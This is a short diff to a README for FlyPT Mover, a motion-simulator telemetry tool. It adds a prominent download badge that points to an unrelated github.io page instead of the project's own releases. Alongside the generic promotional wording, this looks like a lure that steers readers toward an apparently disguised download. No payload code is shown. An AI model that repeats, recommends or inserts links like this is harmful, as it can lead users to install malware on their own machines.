@@ -30,6 +30,12 @@ FlyPT Mover reads game telemetry and outputs motion platform commands for DIY 2D
 
 Whether you're a newcomer or a veteran, FlyPT Mover provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download FlyPT Mover](https://img.shields.io/badge/⬇_DOWNLOAD_FlyPT+Mover-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
